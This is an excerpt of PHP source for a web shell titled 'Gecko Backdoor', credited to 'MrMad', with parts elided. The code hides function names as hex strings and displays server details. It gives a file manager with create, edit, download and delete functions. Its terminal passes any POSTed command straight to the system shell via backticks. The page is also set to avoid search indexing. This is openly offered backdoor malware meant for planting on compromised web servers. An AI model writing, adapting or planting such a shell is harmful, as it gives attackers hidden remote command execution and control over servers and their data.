...
#RECODE BY MRMAD IN MARJIUANA SHELL
$Array = [
		'7068705f756e616d65',
	...
	<html dir="auto" lang="en-US">
		...
		<head>
			...
			<meta name="robots" content="NOINDEX, NOFOLLOW">
				...
				<title>Gecko Backdoor</title>
			<link rel="icon" href="https://github.com/Satria-Mad/MrMad/blob/main/logo1.png" />
...
html{margin:auto;background-color:rgb(10, 10, 10);font-family:Arial, sans-serif, Courier; color: white;}.x{text-align:center}.y{font-family:i;font-size:calc(2.3em + 2.3vw);color:black}.y:hover{color:#fff}.w{color:#fff}.b{color:rgb(0, 0, 0)}.q{margin-top:.5em}article{margin-top:1.5em;font-size:.9em}.i{float:left}.u{float:right;text-align:right;margin-bottom:1.5em}input[type=file]{display:none}input[type=submit]{border: 1px solid white; padding:2px 5px;background:0 0}td{color:white;}th{font-weight:400;}.et{text-align:left;color:black}.r:hover{background:#0e302c}.l{border:1px solid #ffffff;padding:2px;background:0 0}footer{margin-top:2em;height:2.2rem;width:100%;font-size:.9em}footer:hover{color:#fff}a{text-decoration:none;color:white}a:hover{color:orange}.m{margin-left:2.4em}textarea{background:0 0;border:none;width:70%;height:30em;font-family:Courier;font-size:.9em}textarea.o{background:#fff}.h{color:#ea2027}
@import url('https://fonts.googleapis.com/css2?family=Tourney&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Kaushan+Script&display=swap');.duk{font-family: 'Tourney', cursive;}.as{border-bottom: 1px solid black; padding: 0px 5px; border-radius: 3px;}.dis{display: flex;}.h1{font-family: 'Kaushan Script', cursive;text-shadow: 2px 2px orange;}ul{list-style: none;}.tb{background-color: black;}
th{border-bottom:thin solid white;color:#fff;}
			</style>
		</head>
          
		<body>
			<header>
                  <h1 align="center" class="h1">- GeCko BackDoor -</h1>
				<div class="q x w duk">
					Be Creative Once More..
				</div>
			...
			<article>
				<div class="i">
					<ul>
						<li><i class="far fa-hdd"></i>
					<?php echo $GNJ[0](); ?></li>
					</ul>


					<ul>
						<li><i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>SOFT  :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?> <b>PHP :</b> <?php echo $GNJ[1]();?></li>
					</ul>
					<ul>
						<li><i class="fas fa-link"></i> <?php echo $_SERVER['SERVER_ADDR'];?></li>
					</ul>
				...
				<div class="u">
					...
					$d_ = '<br />
										<br />
										<input type="submit" class="w" value="&nbsp;Submit&nbsp;" />
									</form>';
					if(isset($_GET["s"])) {
					...
					elseif(isset($_GET["l"])) {
						echo $a_.'<i class="far fa-plus-square"></i> DIR'.$b_.'
									<form action="" method="post">
					...
					elseif(isset($_GET["n"])) {
						echo $a_.'<i class="far fa-plus-square"></i> FILE'.$b_.'
									<form action="" method="post">
					...
					if(isset($_POST["r"])) {
						...
						echo $a_.'<i class="fas fa-terminal"></i> TERMINAL'.$b_.'<form method="POST"><input type="text" name="cmd">'.$d_.''.$c_;
						echo '<br>';
						echo '<pre>';
						echo `$_POST[cmd]`;
						echo '</pre>';
					...
					echo '<table cellspacing="0" cellpadding="7" width="100%" class="tb">
						<thead>
							<tr>
								<th width="44%">[ NAME ]</th>
								<th width="11%">[ SIZE ]</th>
						...
						<tbody>
							<tr>
                                ...
                                <div class="dis">
								    <ul>
                                    <li><a class="ajx as" href="?d='.hex($d).'&n"><i class="far fa-plus-square"></i> FILE</a></li>
                                    &nbsp;
									<li><a class="ajx as" href="?terminal"><i class="fas fa-tools"></i> TOOLS</a></li>
									</ul>
                                    <ul>
                                    <li><a class="ajx as" href="?d='.hex($d).'&l"><i class="far fa-plus-square"></i> FOLDER</a></li>
                                    </ul>
									<ul>
									<li><a class="ajx as" href="?terminal"><i class="fas fa-terminal"></i> TERMINAL</a></li>
									</ul>
                                    </div>
								</td>
							</tr>
						';
							...
							<td class="x">
								<a class="ajx" href="?d='.hex($e).'&r='.hex($c).'"><i class="fas fa-file-signature"></i></a>
								<a href="?d='.hex($e).'&x='.hex($c).'"><i class="far fa-trash-alt"></i></a>
							</td>
						</tr>
						...
						'
							...
							<td class="x">
								<a class="ajx" href="?d='.hex($e).'&r='.hex($c).'"><i class="fas fa-file-signature"></i></a>
								<a class="ajx" href="?d='.hex($e).'&e='.hex($c).'"><i class="fas fa-edit"></i></a>
								<a href="?d='.hex($e).'&g='.hex($c).'"><i class="fas fa-download"></i></a>
								'.$zi.'
								<a href="?d='.hex($e).'&x='.hex($c).'"><i class="far fa-trash-alt"></i></a>
							</td>
						</tr>
						...
						<tfoot>
							<tr>
                                ...
                                <div class="dis">
									<ul>
                                    <li><a class="ajx as" href="?d='.hex($e).'&y"><i class="fas fa-trash-alt"></i> REQUEST</a></li>
                                    </ul>
									<ul>
                                    <li><a href="?d='.hex($e).'&q" class="as"><i class="fas fa-trash-alt"></i> DELETE SHELL</a></li>
                                    </ul>
                                    </div>
								</th>
			...
			<footer class="x">
				<strong>&copy;&nbsp;Copyright By <b style="text-decoration:underline; color:orange;">MrMad</b></strong>
			</footer>
			<?php
			if(isset($_GET["1"])) {
				echo $f;
